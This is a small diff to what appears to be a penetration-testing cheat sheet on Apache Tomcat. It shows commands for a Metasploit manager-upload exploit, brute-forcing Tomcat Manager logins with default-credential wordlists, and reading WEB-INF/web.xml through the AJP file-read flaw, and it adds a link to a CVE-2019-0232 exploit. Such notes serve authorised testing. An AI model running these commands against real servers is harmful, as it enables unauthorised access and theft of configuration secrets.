@@ -1030,7 +1030,8 @@ msf > use exploit/multi/http/tomcat_mgr_upload
 https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
 $ python3 mgr_brute.py -U <URL> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
-$ python2.7 tomcat-ajp.lfi.py <URL> -p 8009 -f WEB-INF/web.xml 
+$ python2.7 tomcat-ajp.lfi.py <URL> -p 8009 -f WEB-INF/web.xml
+https://github.com/jaiguptanick/CVE-2019-0232/tree/main
 ```
 
 - Tomcat CGI
